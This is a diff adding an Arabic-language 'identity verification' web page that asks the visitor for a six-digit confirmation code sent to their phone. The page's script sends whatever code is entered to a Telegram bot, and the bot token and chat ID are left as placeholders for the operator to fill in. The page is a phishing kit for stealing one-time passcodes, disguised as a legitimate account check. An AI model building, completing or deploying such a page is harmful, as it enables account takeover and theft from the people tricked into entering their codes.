@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>التحقق من الهوية</title>
+<style>
+body {
+font-family: "Tajawal", Arial, sans-serif;
+margin: 0;
+padding: 0;
+min-height: 100vh;
+background: #fff;
+color: #333;
+display: flex;
+flex-direction: column;
+}
+
+/* رأس الصفحة */
+header {
+position: relative;
+padding: 16px;
+text-align: center;
+font-weight: bold;
+font-size: 16px;
+}
+header a {
+position: absolute;
+top: 16px;
+right: 16px;
+font-size: 22px;
+text-decoration: none;
+color: #111;
+transform: scaleX(-1); /* عكس اتجاه السهم */
+}
+
+/* المحتوى */
+main {
+flex: 1;
+display: flex;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+text-align: center;
+padding: 24px 16px;
+}
+
+h2 {
+margin: 20px 0 8px;
+font-size: 20px;
+font-weight: bold;
+}
+p {
+margin: 0 0 20px;
+color: #777;
+font-size: 15px;
+line-height: 1.6;
+}
+
+/* مربعات إدخال الرمز */
+.code-inputs {
+display: flex;
+justify-content: center;
+gap: 10px;
+margin: 20px 0 30px;
+}
+.code-inputs input {
+width: 44px;
+height: 48px;
+text-align: center;
+font-size: 20px;
+border: 1px solid #ccc;
+border-radius: 8px;
+}
+
+/* العداد + إعادة الإرسال */
+.resend-container {
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 10px;
+margin-top: 20px;
+}
+
+.circle {
+position: relative;
+width: 44px;
+height: 44px;
+}
+.circle svg {
+transform: rotate(-90deg);
+width: 44px;
+height: 44px;
+}
+.circle circle {
+fill: none;
+stroke-width: 4;
+stroke-linecap: round;
+}
+.circle .bg {
+stroke: #eee;
+}
+.circle .progress {
+stroke: #ff6a2b;
+stroke-dasharray: 138;
+stroke-dashoffset: 0;
+transition: stroke-dashoffset 1s linear;
+}
+.circle span {
+position: absolute;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+font-size: 13px;
+font-weight: bold;
+color: #ff6a2b;
+}
+
+#resendText {
+font-size: 15px;
+color: #aaa;
+cursor: default;
+transition: color 0.3s;
+}
+#resendText.active {
+color: #000;
+cursor: pointer;
+}
+
+/* زر التالي */
+#nextBtn {
+width: 92%;
+max-width: 400px;
+padding: 14px;
+font-size: 18px;
+font-weight: bold;
+border: none;
+border-radius: 8px;
+background: #ddd;
+color: #888;
+cursor: not-allowed;
+margin: 24px auto;
+transition: 0.3s;
+}
+#nextBtn.active {
+background: #ff6a2b;
+color: #fff;
+cursor: pointer;
+}
+
+@media (max-width: 480px) {
+h2 { font-size: 25px; }
+p { font-size: 15px; }
+.code-inputs input {
+width: 40px;
+height: 44px;
+font-size: 18px;
+}
+}
+</style>
+</head>
+<body>
+<header>
+<span>التحقق من الهوية</span>
+<a href="index.html">←</a>
+</header>
+
+<main>
+<h2>تم ارسال رمز التأكيد</h2>
+<p>ادخل رمز التأكيد المكون من 6 خانات والذي تم إرساله إلى هاتفك للتحقق من حسابك</p>
+
+<div class="code-inputs">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+</div>
+
+<div class="resend-container">
+<div class="circle">
+<svg>
+<circle class="bg" cx="22" cy="22" r="20"></circle>
+<circle class="progress" cx="22" cy="22" r="20"></circle>
+</svg>
+<span id="countdown">60</span>
+</div>
+<span id="resendText">أعد إرسال رمز التأكيد</span>
+</div>
+</main>
+
+<button id="nextBtn">التالي</button>
+
+<script>
+// 🔹 ضع بيانات بوت التلجرام هنا
+const BOT_TOKEN = "ضع_هنا_التوكن";
+const CHAT_ID = "ضع_هنا_الآي_دي";
+
+const inputs = document.querySelectorAll(".code-inputs input");
+const nextBtn = document.getElementById("nextBtn");
+const resendText = document.getElementById("resendText");
+const countdownEl = document.getElementById("countdown");
+const progressCircle = document.querySelector(".progress");
+const circumference = 2 * Math.PI * 20;
+
+progressCircle.style.strokeDasharray = circumference;
+
+let timer;
+let timeLeft = 60;
+
+function startTimer() {
+timeLeft = 60;
+countdownEl.textContent = timeLeft;
+resendText.classList.remove("active");
+
+timer = setInterval(() => {
+timeLeft--;
+countdownEl.textContent = timeLeft;
+const offset = circumference - (timeLeft / 60) * circumference;
+progressCircle.style.strokeDashoffset = offset;
+
+if (timeLeft <= 0) {
+clearInterval(timer);
+countdownEl.textContent = "0";
+resendText.classList.add("active");
+}
+}, 1000);
+}
+
+// أول تشغيل
+startTimer();
+
+resendText.addEventListener("click", () => {
+if (resendText.classList.contains("active")) {
+startTimer();
+}
+});
+
+// تفعيل زر التالي عند إدخال 6 خانات
+inputs.forEach((input, idx) => {
+input.addEventListener("input", () => {
+if (input.value.length === 1 && idx < inputs.length - 1) {
+inputs[idx + 1].focus();
+}
+checkCode();
+});
+});
+
+function checkCode() {
+let code = "";
+inputs.forEach(inp => code += inp.value);
+if (code.length === 6) {
+nextBtn.classList.add("active");
+nextBtn.disabled = false;
+} else {
+nextBtn.classList.remove("active");
+nextBtn.disabled = true;
+}
+}
+
+// إرسال الرمز إلى تلجرام
+function sendToTelegram(code) {
+const message = `🔑 تم إدخال رمز التأكيد:\n${code}`;
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+chat_id: CHAT_ID,
+text: message
+})
+})
+.then(res => res.json())
+.then(data => console.log("تم الإرسال:", data))
+.catch(err => console.error("خطأ في الإرسال:", err));
+}
+
+// عند الضغط على زر التالي
+nextBtn.addEventListener("click", () => {
+let code = "";
+inputs.forEach(inp => code += inp.value);
+if (code.length === 6) {
+sendToTelegram(code);
+alert("🚀 تم إرسال رمز التأكيد إلى تلجرام");
+}
+});
+</script>
+</body>
+</html>
